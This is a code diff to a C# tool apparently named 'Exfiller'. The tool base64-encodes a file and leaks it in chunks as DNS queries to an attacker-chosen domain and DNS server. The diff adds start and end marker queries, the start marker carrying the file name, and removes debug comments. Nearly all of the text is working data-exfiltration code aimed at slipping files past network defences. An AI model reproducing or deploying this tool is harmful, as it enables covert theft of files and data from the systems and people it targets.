@@ -14,7 +14,6 @@ namespace Exfiller
 		static void Main(string[] args)
 		{
 			// Setup DNSClient variables using command line argument as the target DNS server
-      		// The DNSClient NuGet package needs to be added
 			String targetDNSServer = args[1];
 			var endpoint = new IPEndPoint(IPAddress.Parse(targetDNSServer), 53);
 			var client = new LookupClient(endpoint);
@@ -30,24 +29,14 @@ namespace Exfiller
 				// Convert any equals signs to dashes so they can be included in a URL
 				b64File = b64File.Replace("=", "-");
 
-				//Console.WriteLine("Base64: " + b64File + "\n");
 
-				//for (int i = 0; i < b64File.Length; i+=20)
-				//{
-				//	try
-				//	{
-				//		Console.WriteLine("Target: " + b64File.Substring(i, 20) + targetDomain);
-				//	}
-				//	catch
-				//	{
-				//		Console.WriteLine("Target: " + b64File.Substring(i) + targetDomain);
-				//	}
-				//}
-
-				
 				// Loop over Base64 data and send 30 characters at a time as a DNS request appended to the provided domain
 				Console.WriteLine("\n[*] Sending DNS requests to " + targetDNSServer);
-				int counter = 0;
+
+				// Set counter to start at 1 and send start of file identifier
+				client.Query("11111" + args[0].Replace(".", "-") + "11111" + targetDomain, QueryType.A);
+				int counter = 1;
+
 				for (int i = 0; i < b64File.Length; i += 30)
 				{
 					try
@@ -62,6 +51,9 @@ namespace Exfiller
 					}
 				}
 
+				// Send end of file identifier
+				client.Query("000000000000000" + targetDomain, QueryType.A);
+
 				Console.WriteLine($"\n[+] Successfully sent file '{args[0]}' over {counter} DNS requests to {targetDNSServer}");
 
 
@@ -75,7 +67,6 @@ namespace Exfiller
 			{
 				Console.WriteLine("Error reading file!");
 			}
-
 		}
 	}
 }
